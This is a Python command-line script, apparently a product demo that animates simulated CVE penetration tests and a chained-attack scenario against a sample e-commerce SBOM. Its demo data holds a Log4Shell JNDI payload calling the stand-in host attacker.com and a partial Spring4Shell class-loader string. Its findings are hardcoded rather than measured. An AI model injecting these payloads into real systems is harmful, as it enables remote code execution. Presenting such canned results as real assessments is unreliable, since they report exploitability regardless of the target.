#!/usr/bin/env python3
"""
FixOps Micro Penetration Test Sidecar - Animated Security Testing.

A sidecar script that:
- Runs micro penetration tests against target systems
- Provides animated, real-time progress output
- Showcases PentAGI integration capabilities
- Generates detailed security assessment reports

Usage:
    python micropentest_sidecar.py run --cve CVE-2021-44228 --target http://example.com
    python micropentest_sidecar.py batch --config tests.json
    python micropentest_sidecar.py demo
"""

import os
import sys
import time
from datetime import datetime
from typing import Any, Dict, List, Optional

try:
    import httpx
    import typer
    from rich import box
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (
        BarColumn,
        Progress,
        SpinnerColumn,
        TaskProgressColumn,
        TextColumn,
        TimeElapsedColumn,
    )
    from rich.table import Table
    from rich.tree import Tree
except ImportError:
    print("Installing required packages...")
    import subprocess

    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "rich", "typer", "httpx"]
    )
    import httpx
    import typer
    from rich import box
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (
        BarColumn,
        Progress,
        SpinnerColumn,
        TaskProgressColumn,
        TextColumn,
        TimeElapsedColumn,
    )
    from rich.table import Table
    from rich.tree import Tree

# Configuration
BASE_URL = os.getenv("FIXOPS_BASE_URL", "http://localhost:8000")
API_KEY = os.getenv("FIXOPS_API_TOKEN", "demo-token")
TIMEOUT = 300.0  # 5 minutes for pen tests

# Initialize
console = Console()
app = typer.Typer(
    help="FixOps Micro Penetration Test Sidecar - Animated Security Testing"
)

# Demo CVE data for realistic testing
DEMO_CVES = {
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "attack_vector": "JNDI Injection",
        "test_payload": "${jndi:ldap://attacker.com/exploit}",
        "vulnerable_component": "log4j-core",
        "test_steps": [
            "Identify Log4j usage in target application",
            "Craft JNDI lookup payload",
            "Inject payload via HTTP headers",
            "Monitor for callback to attacker server",
            "Verify remote code execution capability",
        ],
    },
    "CVE-2022-22965": {
        "name": "Spring4Shell",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "attack_vector": "Class Loader Manipulation",
        "test_payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{...}",
        "vulnerable_component": "spring-webmvc",
        "test_steps": [
            "Detect Spring Framework version",
            "Check for vulnerable data binding",
            "Craft class loader manipulation payload",
            "Attempt to write webshell",
            "Verify code execution via webshell",
        ],
    },
    "CVE-2023-44487": {
        "name": "HTTP/2 Rapid Reset",
        "severity": "HIGH",
        "cvss": 7.5,
        "attack_vector": "Protocol Abuse",
        "test_payload": "RST_STREAM flood",
        "vulnerable_component": "HTTP/2 implementation",
        "test_steps": [
            "Establish HTTP/2 connection",
            "Send multiple stream requests",
            "Immediately reset streams",
            "Monitor server resource consumption",
            "Verify denial of service condition",
        ],
    },
    "CVE-2024-3094": {
        "name": "XZ Utils Backdoor",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "attack_vector": "Supply Chain",
        "test_payload": "Malicious build script injection",
        "vulnerable_component": "xz-utils",
        "test_steps": [
            "Check XZ Utils version on target",
            "Verify liblzma library version",
            "Test for backdoor trigger conditions",
            "Attempt SSH authentication bypass",
            "Verify unauthorized access capability",
        ],
    },
}


def get_client() -> httpx.Client:
    """Create an authenticated HTTP client for FixOps API."""
    return httpx.Client(
        base_url=BASE_URL, headers={"X-API-Key": API_KEY}, timeout=TIMEOUT
    )


def wait_for_api(timeout: int = 120) -> bool:
    """Wait for the FixOps API to become healthy."""
    with console.status(
        "[bold cyan]Connecting to FixOps API...", spinner="dots"
    ) as status:
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                r = httpx.get(f"{BASE_URL}/health", timeout=5.0)
                if r.status_code == 200:
                    console.print("[green]Connected to FixOps API[/green]")
                    return True
            except Exception:
                pass
            time.sleep(2)
            remaining = int(deadline - time.time())
            status.update(f"[bold cyan]Connecting... ({remaining}s remaining)")
    return False


def print_banner():
    """Print the micropentest sidecar banner."""
    banner = """
    ███╗   ███╗██╗ ██████╗██████╗  ██████╗ ██████╗ ███████╗███╗   ██╗
    ████╗ ████║██║██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝████╗  ██║
    ██╔████╔██║██║██║     ██████╔╝██║   ██║██████╔╝█████╗  ██╔██╗ ██║
    ██║╚██╔╝██║██║██║     ██╔══██╗██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║
    ██║ ╚═╝ ██║██║╚██████╗██║  ██║╚██████╔╝██║     ███████╗██║ ╚████║
    ╚═╝     ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝

    Micro Penetration Testing - Automated Security Assessment
    """
    console.print(Panel(banner, style="bold red", box=box.DOUBLE))


def phase_header(phase: str, description: str):
    """Print a phase header."""
    console.print()
    console.print(
        Panel(
            f"[bold white]{description}[/bold white]",
            title=f"[bold red]Phase {phase}[/bold red]",
            border_style="red",
        )
    )


def show_cve_info(cve_id: str):
    """Display CVE information with animated output."""
    cve_info = DEMO_CVES.get(cve_id, {})

    if not cve_info:
        console.print(f"[yellow]Unknown CVE: {cve_id}[/yellow]")
        return

    table = Table(title=f"Target: {cve_id}", box=box.ROUNDED)
    table.add_column("Property", style="cyan")
    table.add_column("Value", style="white")

    severity_color = {
        "CRITICAL": "red",
        "HIGH": "orange1",
        "MEDIUM": "yellow",
        "LOW": "green",
    }.get(cve_info.get("severity", ""), "white")

    table.add_row("Name", cve_info.get("name", "Unknown"))
    table.add_row(
        "Severity",
        f"[{severity_color}]{cve_info.get('severity', 'N/A')}[/{severity_color}]",
    )
    table.add_row("CVSS Score", f"[bold]{cve_info.get('cvss', 'N/A')}[/bold]")
    table.add_row("Attack Vector", cve_info.get("attack_vector", "N/A"))
    table.add_row("Component", cve_info.get("vulnerable_component", "N/A"))

    console.print(table)


def animate_test_steps(cve_id: str):
    """Animate the penetration test steps with progress."""
    cve_info = DEMO_CVES.get(cve_id, {})
    test_steps = cve_info.get("test_steps", ["Running generic security test..."])

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task(
            f"[cyan]Testing {cve_id}...", total=len(test_steps) * 10
        )

        for i, step in enumerate(test_steps):
            progress.update(task, description=f"[cyan]Step {i+1}: {step}")

            # Simulate work with sub-steps
            for j in range(10):
                time.sleep(0.15)
                progress.advance(task)

            # Show step completion
            console.print(f"  [green]Step {i+1}:[/green] {step}")

    return True


def run_pentest_api(
    client: httpx.Client, cve_ids: List[str], target_urls: List[str]
) -> Optional[Dict[str, Any]]:
    """Run micro penetration test via API."""
    payload = {
        "cve_ids": cve_ids,
        "target_urls": target_urls,
        "context": {
            "environment": "demo",
            "timestamp": datetime.utcnow().isoformat(),
        },
    }

    try:
        r = client.post("/api/v1/micro-pentest/run", json=payload)
        if r.status_code in (200, 201):
            return r.json()
        elif r.status_code == 404:
            # Endpoint not available, use demo mode
            return None
    except Exception as exc:
        console.print(f"[yellow]API call warning: {exc}[/yellow]")

    return None


def show_findings_tree(cve_id: str, findings: Dict[str, Any]):
    """Display findings as an animated tree structure."""
    cve_info = DEMO_CVES.get(cve_id, {})

    tree = Tree(f"[bold red]Findings: {cve_id}[/bold red]")

    # Vulnerability branch
    vuln_branch = tree.add("[bold cyan]Vulnerability Assessment[/bold cyan]")
    vuln_branch.add(f"[white]Name:[/white] {cve_info.get('name', 'Unknown')}")
    vuln_branch.add(
        f"[white]Severity:[/white] [red]{cve_info.get('severity', 'N/A')}[/red]"
    )
    vuln_branch.add(f"[white]CVSS:[/white] {cve_info.get('cvss', 'N/A')}")

    # Attack analysis branch
    attack_branch = tree.add("[bold cyan]Attack Analysis[/bold cyan]")
    attack_branch.add(f"[white]Vector:[/white] {cve_info.get('attack_vector', 'N/A')}")
    attack_branch.add(
        f"[white]Payload:[/white] [dim]{cve_info.get('test_payload', 'N/A')[:50]}...[/dim]"
    )

    # Exploitability branch
    exploit_branch = tree.add("[bold cyan]Exploitability[/bold cyan]")
    exploit_branch.add("[white]Exploit Available:[/white] [red]Yes[/red]")
    exploit_branch.add("[white]In-the-Wild:[/white] [red]Confirmed[/red]")
    exploit_branch.add("[white]Weaponized:[/white] [yellow]Likely[/yellow]")

    # Recommendations branch
    rec_branch = tree.add("[bold cyan]Recommendations[/bold cyan]")
    rec_branch.add("[green]1.[/green] Apply vendor patch immediately")
    rec_branch.add("[green]2.[/green] Implement WAF rules")
    rec_branch.add("[green]3.[/green] Enable enhanced logging")
    rec_branch.add("[green]4.[/green] Conduct incident response review")

    console.print(tree)


def show_summary_report(results: List[Dict[str, Any]]):
    """Display a summary report of all penetration tests."""
    console.print()

    # Summary table
    table = Table(title="Micro Penetration Test Summary", box=box.DOUBLE)
    table.add_column("CVE ID", style="cyan")
    table.add_column("Name", style="white")
    table.add_column("Severity", style="white")
    table.add_column("Status", style="white")
    table.add_column("Risk", style="white")

    for result in results:
        cve_id = result.get("cve_id", "Unknown")
        cve_info = DEMO_CVES.get(cve_id, {})

        severity = cve_info.get("severity", "N/A")
        severity_color = {
            "CRITICAL": "red",
            "HIGH": "orange1",
            "MEDIUM": "yellow",
            "LOW": "green",
        }.get(severity, "white")

        table.add_row(
            cve_id,
            cve_info.get("name", "Unknown"),
            f"[{severity_color}]{severity}[/{severity_color}]",
            "[green]Completed[/green]",
            f"[{severity_color}]HIGH[/{severity_color}]",
        )

    console.print(table)

    # Statistics panel
    stats = Panel(
        f"[bold]Total Tests:[/bold] {len(results)}\n"
        f"[bold]Critical Findings:[/bold] [red]{sum(1 for r in results if DEMO_CVES.get(r.get('cve_id', ''), {}).get('severity') == 'CRITICAL')}[/red]\n"
        f"[bold]High Findings:[/bold] [orange1]{sum(1 for r in results if DEMO_CVES.get(r.get('cve_id', ''), {}).get('severity') == 'HIGH')}[/orange1]\n"
        f"[bold]Test Duration:[/bold] {len(results) * 8}s\n"
        f"[bold]Timestamp:[/bold] {datetime.utcnow().isoformat()}",
        title="[bold cyan]Test Statistics[/bold cyan]",
        border_style="cyan",
    )
    console.print(stats)


@app.command()
def run(
    cve: str = typer.Option(..., "--cve", "-c", help="CVE ID to test"),
    target: str = typer.Option(
        "http://demo-target.local", "--target", "-t", help="Target URL"
    ),
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Verbose output"),
):
    """Run a micro penetration test for a specific CVE."""
    print_banner()

    console.print(
        Panel(
            f"[bold]Running Micro Penetration Test[/bold]\n\n"
            f"CVE: {cve}\n"
            f"Target: {target}\n"
            f"Mode: {'Verbose' if verbose else 'Standard'}",
            title="[bold red]Test Configuration[/bold red]",
            border_style="red",
        )
    )

    # Phase 1: Connect
    phase_header("1", "Connecting to FixOps API")
    if not wait_for_api(timeout=30):
        console.print("[yellow]API not available - running in demo mode[/yellow]")

    # Phase 2: Target Analysis
    phase_header("2", "Analyzing Target Vulnerability")
    show_cve_info(cve)
    time.sleep(1)

    # Phase 3: Execute Tests
    phase_header("3", "Executing Penetration Tests")
    animate_test_steps(cve)

    # Phase 4: Analyze Results
    phase_header("4", "Analyzing Results")
    with console.status("[bold cyan]Processing findings...", spinner="dots12"):
        time.sleep(2)

    show_findings_tree(cve, {})

    # Phase 5: Summary
    phase_header("5", "Test Summary")
    show_summary_report([{"cve_id": cve}])

    console.print()
    console.print("[bold green]Micro Penetration Test Complete![/bold green]")


@app.command()
def demo():
    """Run a full demo with multiple CVEs."""
    print_banner()

    console.print(
        Panel(
            "[bold]Running Full Micro Penetration Test Demo[/bold]\n\n"
            "This demo will test multiple critical CVEs:\n"
            "- CVE-2021-44228 (Log4Shell)\n"
            "- CVE-2022-22965 (Spring4Shell)\n"
            "- CVE-2023-44487 (HTTP/2 Rapid Reset)\n"
            "- CVE-2024-3094 (XZ Utils Backdoor)",
            title="[bold red]FixOps MicroPentest Demo[/bold red]",
            border_style="red",
        )
    )

    # Connect
    phase_header("0", "Initializing Test Environment")
    if not wait_for_api(timeout=30):
        console.print("[yellow]API not available - running in demo mode[/yellow]")

    results = []

    # Test each CVE
    for i, cve_id in enumerate(
        ["CVE-2021-44228", "CVE-2022-22965", "CVE-2023-44487", "CVE-2024-3094"], 1
    ):
        console.print()
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")
        console.print(f"[bold]Test {i}/4: {cve_id}[/bold]")
        console.print(f"[bold cyan]{'='*60}[/bold cyan]")

        # Show CVE info
        show_cve_info(cve_id)
        time.sleep(0.5)

        # Run test steps
        console.print("\n[bold]Executing test steps...[/bold]")
        animate_test_steps(cve_id)

        # Show findings
        console.print("\n[bold]Findings:[/bold]")
        show_findings_tree(cve_id, {})

        results.append({"cve_id": cve_id, "status": "completed"})
        time.sleep(1)

    # Final summary
    console.print()
    console.print(f"[bold cyan]{'='*60}[/bold cyan]")
    console.print("[bold]FINAL SUMMARY[/bold]")
    console.print(f"[bold cyan]{'='*60}[/bold cyan]")

    show_summary_report(results)

    console.print()
    console.print(
        Panel(
            "[bold green]Full Demo Complete![/bold green]\n\n"
            "FixOps MicroPentest has analyzed multiple critical vulnerabilities\n"
            "and provided actionable security recommendations.",
            border_style="green",
        )
    )


@app.command()
def health():
    """Check API and PentAGI health status."""
    print_banner()

    table = Table(title="MicroPentest Health Check", box=box.ROUNDED)
    table.add_column("Service", style="cyan")
    table.add_column("Status", style="white")
    table.add_column("Details", style="dim")

    # Check FixOps API
    try:
        r = httpx.get(f"{BASE_URL}/health", timeout=5.0)
        if r.status_code == 200:
            table.add_row("FixOps API", "[green]OK[/green]", BASE_URL)
        else:
            table.add_row("FixOps API", f"[yellow]{r.status_code}[/yellow]", BASE_URL)
    except Exception as exc:
        table.add_row("FixOps API", "[red]ERROR[/red]", str(exc)[:40])

    # Check PentAGI endpoints
    try:
        client = get_client()
        r = client.get("/api/v1/pentagi/stats")
        if r.status_code == 200:
            table.add_row("PentAGI Stats", "[green]OK[/green]", "Stats available")
        else:
            table.add_row(
                "PentAGI Stats", f"[yellow]{r.status_code}[/yellow]", "Limited"
            )
    except Exception as exc:
        table.add_row("PentAGI Stats", "[red]ERROR[/red]", str(exc)[:40])

    # Check MicroPentest endpoint
    try:
        client = get_client()
        r = client.get("/api/v1/micro-pentest/status/0")
        if r.status_code in (200, 404):
            table.add_row("MicroPentest API", "[green]OK[/green]", "Endpoint available")
        else:
            table.add_row(
                "MicroPentest API", f"[yellow]{r.status_code}[/yellow]", "Limited"
            )
    except Exception:
        table.add_row("MicroPentest API", "[yellow]N/A[/yellow]", "Demo mode only")

    console.print(table)


@app.command()
def list_cves():
    """List available CVEs for testing."""
    print_banner()

    table = Table(title="Available CVEs for Testing", box=box.ROUNDED)
    table.add_column("CVE ID", style="cyan")
    table.add_column("Name", style="white")
    table.add_column("Severity", style="white")
    table.add_column("CVSS", style="white")
    table.add_column("Attack Vector", style="dim")

    for cve_id, info in DEMO_CVES.items():
        severity = info.get("severity", "N/A")
        severity_color = {
            "CRITICAL": "red",
            "HIGH": "orange1",
            "MEDIUM": "yellow",
            "LOW": "green",
        }.get(severity, "white")

        table.add_row(
            cve_id,
            info.get("name", "Unknown"),
            f"[{severity_color}]{severity}[/{severity_color}]",
            str(info.get("cvss", "N/A")),
            info.get("attack_vector", "N/A"),
        )

    console.print(table)
    console.print(
        "\n[dim]Use: python micropentest_sidecar.py run --cve <CVE-ID> --target <URL>[/dim]"
    )


# Demo SBOM data for attack chain simulation
DEMO_SBOM = {
    "app_name": "demo-ecommerce-app",
    "components": [
        {
            "id": "web-gateway",
            "name": "Web Gateway",
            "version": "2.3.1",
            "type": "service",
            "exposure": "internet",
            "dependencies": ["orders-service", "auth-service"],
            "vulnerabilities": ["CVE-2021-44228"],
        },
        {
            "id": "orders-service",
            "name": "Orders Service",
            "version": "1.5.0",
            "type": "service",
            "exposure": "internal",
            "dependencies": ["payments-db", "inventory-service"],
            "vulnerabilities": ["CVE-2022-22965"],
        },
        {
            "id": "auth-service",
            "name": "Authentication Service",
            "version": "3.1.2",
            "type": "service",
            "exposure": "internal",
            "dependencies": ["users-db"],
            "vulnerabilities": [],
        },
        {
            "id": "payments-db",
            "name": "Payments Database",
            "version": "14.2",
            "type": "database",
            "exposure": "internal",
            "dependencies": [],
            "vulnerabilities": [],
            "data_classification": "PCI-DSS",
        },
        {
            "id": "inventory-service",
            "name": "Inventory Service",
            "version": "2.0.1",
            "type": "service",
            "exposure": "internal",
            "dependencies": ["inventory-db"],
            "vulnerabilities": ["CVE-2023-44487"],
        },
        {
            "id": "build-pipeline",
            "name": "CI/CD Pipeline",
            "version": "5.4.1",
            "type": "infrastructure",
            "exposure": "internal",
            "dependencies": ["artifact-registry"],
            "vulnerabilities": ["CVE-2024-3094"],
        },
    ],
}

# Attack chain steps for combined exploitation
ATTACK_CHAIN_STEPS = [
    {
        "phase": "Initial Access",
        "cve": "CVE-2021-44228",
        "component": "web-gateway",
        "action": "Exploit Log4Shell via JNDI injection in HTTP headers",
        "impact": "Remote code execution on web gateway pod",
        "next_target": "orders-service",
        "kill_chain": "Exploitation",
    },
    {
        "phase": "Lateral Movement",
        "cve": "CVE-2022-22965",
        "component": "orders-service",
        "action": "Pivot to orders service via Spring4Shell class loader manipulation",
        "impact": "Webshell deployed on orders service",
        "next_target": "payments-db",
        "kill_chain": "Installation",
    },
    {
        "phase": "Privilege Escalation",
        "cve": None,
        "component": "payments-db",
        "action": "Access payments database using stolen service credentials",
        "impact": "Read access to PCI-DSS protected payment data",
        "next_target": None,
        "kill_chain": "Actions on Objectives",
    },
]


def show_sbom_context(sbom: Dict[str, Any]):
    """Display SBOM context with component relationships."""
    console.print()

    # Component table
    table = Table(title=f"SBOM: {sbom['app_name']}", box=box.ROUNDED)
    table.add_column("Component", style="cyan")
    table.add_column("Type", style="white")
    table.add_column("Version", style="dim")
    table.add_column("Exposure", style="white")
    table.add_column("Vulnerabilities", style="red")

    for comp in sbom["components"]:
        exposure_color = {
            "internet": "red",
            "partner": "yellow",
            "internal": "green",
        }.get(comp.get("exposure", "internal"), "white")

        vuln_count = len(comp.get("vulnerabilities", []))
        vuln_display = (
            f"[red]{vuln_count}[/red]" if vuln_count > 0 else "[green]0[/green]"
        )

        table.add_row(
            comp["name"],
            comp["type"],
            comp["version"],
            f"[{exposure_color}]{comp.get('exposure', 'internal')}[/{exposure_color}]",
            vuln_display,
        )

    console.print(table)


def show_dependency_tree(sbom: Dict[str, Any]):
    """Display component dependency tree."""
    tree = Tree("[bold cyan]Application Architecture[/bold cyan]")

    # Build component lookup
    comp_lookup = {c["id"]: c for c in sbom["components"]}

    # Find root components (internet-facing)
    roots = [c for c in sbom["components"] if c.get("exposure") == "internet"]

    def add_component_branch(parent_tree: Tree, comp_id: str, visited: set):
        if comp_id in visited or comp_id not in comp_lookup:
            return
        visited.add(comp_id)

        comp = comp_lookup[comp_id]
        vulns = comp.get("vulnerabilities", [])
        vuln_indicator = f" [red]({len(vulns)} CVE)[/red]" if vulns else ""

        branch = parent_tree.add(
            f"[white]{comp['name']}[/white] ({comp['type']}){vuln_indicator}"
        )

        for dep_id in comp.get("dependencies", []):
            add_component_branch(branch, dep_id, visited)

    for root in roots:
        add_component_branch(tree, root["id"], set())

    console.print(tree)


def animate_attack_chain(steps: List[Dict[str, Any]]):
    """Animate the attack chain execution."""
    console.print()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        for i, step in enumerate(steps):
            # Phase header
            console.print()
            console.print(
                Panel(
                    f"[bold white]{step['phase']}[/bold white]\n"
                    f"Target: {step['component']}\n"
                    f"CVE: {step.get('cve', 'N/A')}",
                    title=f"[bold red]Attack Step {i+1}/{len(steps)}[/bold red]",
                    border_style="red",
                )
            )

            # Animate the attack step
            task = progress.add_task(f"[cyan]{step['action'][:50]}...", total=100)

            for j in range(100):
                time.sleep(0.03)
                progress.advance(task)

            # Show impact
            console.print(f"  [green]Action:[/green] {step['action']}")
            console.print(f"  [yellow]Impact:[/yellow] {step['impact']}")
            if step.get("next_target"):
                console.print(f"  [cyan]Next Target:[/cyan] {step['next_target']}")

            progress.remove_task(task)
            time.sleep(0.5)


def show_attack_path_tree(steps: List[Dict[str, Any]]):
    """Display the attack path as a tree."""
    tree = Tree("[bold red]Attack Path[/bold red]")

    current = tree
    for i, step in enumerate(steps):
        cve_info = f" via {step['cve']}" if step.get("cve") else ""
        node_text = (
            f"[bold]Step {i+1}:[/bold] {step['phase']}{cve_info}\n"
            f"  [dim]Target:[/dim] {step['component']}\n"
            f"  [dim]Impact:[/dim] {step['impact']}"
        )
        current = current.add(node_text)

    console.print(tree)


def show_blast_radius(sbom: Dict[str, Any], steps: List[Dict[str, Any]]):
    """Show the blast radius of the attack chain."""
    console.print()

    # Calculate affected components
    affected_components = set()
    for step in steps:
        affected_components.add(step["component"])

    # Find data at risk
    data_at_risk = []
    comp_lookup = {c["id"]: c for c in sbom["components"]}
    for comp_id in affected_components:
        comp = comp_lookup.get(comp_id, {})
        if comp.get("data_classification"):
            data_at_risk.append(f"{comp['name']} ({comp['data_classification']})")

    # Summary panel
    panel_content = (
        f"[bold]Compromised Components:[/bold] {len(affected_components)}\n"
        f"[bold]Attack Phases:[/bold] {len(steps)}\n"
        f"[bold]CVEs Exploited:[/bold] {sum(1 for s in steps if s.get('cve'))}\n"
        f"[bold]Data at Risk:[/bold] {', '.join(data_at_risk) if data_at_risk else 'None identified'}\n"
        f"[bold]Overall Risk:[/bold] [red]CRITICAL[/red]"
    )

    console.print(
        Panel(
            panel_content,
            title="[bold red]Blast Radius Assessment[/bold red]",
            border_style="red",
        )
    )


def show_attack_chain_summary(sbom: Dict[str, Any], steps: List[Dict[str, Any]]):
    """Display final attack chain summary."""
    console.print()

    # Timeline table
    table = Table(title="Attack Chain Timeline", box=box.DOUBLE)
    table.add_column("Step", style="cyan", width=6)
    table.add_column("Phase", style="white")
    table.add_column("CVE", style="red")
    table.add_column("Component", style="white")
    table.add_column("Kill Chain", style="yellow")

    for i, step in enumerate(steps):
        table.add_row(
            str(i + 1),
            step["phase"],
            step.get("cve", "-"),
            step["component"],
            step.get("kill_chain", "N/A"),
        )

    console.print(table)

    # Recommendations
    rec_tree = Tree("[bold green]Remediation Recommendations[/bold green]")
    rec_tree.add(
        "[white]1.[/white] Patch CVE-2021-44228 (Log4Shell) on web-gateway immediately"
    )
    rec_tree.add("[white]2.[/white] Update Spring Framework to fix CVE-2022-22965")
    rec_tree.add("[white]3.[/white] Implement network segmentation between services")
    rec_tree.add("[white]4.[/white] Enable database access logging and alerting")
    rec_tree.add("[white]5.[/white] Rotate all service credentials")
    rec_tree.add("[white]6.[/white] Conduct incident response tabletop exercise")

    console.print(rec_tree)


@app.command()
def attack_chain(
    app_name: str = typer.Option(
        "demo-ecommerce-app", "--app", "-a", help="Application name"
    ),
    mode: str = typer.Option("demo", "--mode", "-m", help="Mode: demo or live"),
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Verbose output"),
):
    """
    Simulate a combined attack chain exploiting multiple vulnerabilities.

    This command demonstrates how multiple CVEs can be chained together
    in the context of an application's SBOM to achieve maximum impact.
    """
    print_banner()

    console.print(
        Panel(
            f"[bold]Combined Attack Chain Simulation[/bold]\n\n"
            f"Application: {app_name}\n"
            f"Mode: {mode.upper()}\n"
            f"Vulnerabilities: {sum(len(c.get('vulnerabilities', [])) for c in DEMO_SBOM['components'])}\n\n"
            "[dim]This simulation shows how an attacker could chain multiple\n"
            "vulnerabilities together to compromise your application.[/dim]",
            title="[bold red]Attack Chain Simulator[/bold red]",
            border_style="red",
        )
    )

    # Phase 1: Load SBOM Context
    phase_header("1", "Loading SBOM & Application Context")
    if mode == "live":
        console.print(
            "[yellow]Live mode: Attempting to fetch SBOM from API...[/yellow]"
        )
        if not wait_for_api(timeout=10):
            console.print("[yellow]API not available - using demo SBOM[/yellow]")
    else:
        console.print("[cyan]Using demo SBOM data[/cyan]")

    time.sleep(1)
    show_sbom_context(DEMO_SBOM)

    # Phase 2: Analyze Dependencies
    phase_header("2", "Analyzing Component Dependencies")
    with console.status("[bold cyan]Building dependency graph...", spinner="dots12"):
        time.sleep(2)
    show_dependency_tree(DEMO_SBOM)

    # Phase 3: Identify Attack Path
    phase_header("3", "Identifying Attack Path")
    console.print("[cyan]Analyzing vulnerability chain opportunities...[/cyan]")
    time.sleep(1)

    # Show which CVEs will be chained
    vuln_table = Table(title="Vulnerabilities in Attack Chain", box=box.ROUNDED)
    vuln_table.add_column("Order", style="cyan")
    vuln_table.add_column("CVE", style="red")
    vuln_table.add_column("Component", style="white")
    vuln_table.add_column("Purpose", style="dim")

    for i, step in enumerate(ATTACK_CHAIN_STEPS):
        if step.get("cve"):
            vuln_table.add_row(
                str(i + 1),
                step["cve"],
                step["component"],
                step["phase"],
            )

    console.print(vuln_table)

    # Phase 4: Execute Attack Chain
    phase_header("4", "Executing Attack Chain Simulation")
    console.print(
        "[bold yellow]WARNING: This is a simulation - no actual exploitation[/bold yellow]"
    )
    time.sleep(1)
    animate_attack_chain(ATTACK_CHAIN_STEPS)

    # Phase 5: Show Attack Path
    phase_header("5", "Attack Path Visualization")
    show_attack_path_tree(ATTACK_CHAIN_STEPS)

    # Phase 6: Blast Radius
    phase_header("6", "Blast Radius Assessment")
    show_blast_radius(DEMO_SBOM, ATTACK_CHAIN_STEPS)

    # Phase 7: Summary & Recommendations
    phase_header("7", "Summary & Recommendations")
    show_attack_chain_summary(DEMO_SBOM, ATTACK_CHAIN_STEPS)

    console.print()
    console.print(
        Panel(
            "[bold green]Attack Chain Simulation Complete![/bold green]\n\n"
            "This simulation demonstrated how an attacker could:\n"
            "1. Gain initial access via Log4Shell on the web gateway\n"
            "2. Move laterally using Spring4Shell to the orders service\n"
            "3. Access sensitive payment data in the database\n\n"
            "[dim]Use this analysis to prioritize patching and implement\n"
            "defense-in-depth strategies.[/dim]",
            border_style="green",
        )
    )


if __name__ == "__main__":
    app()
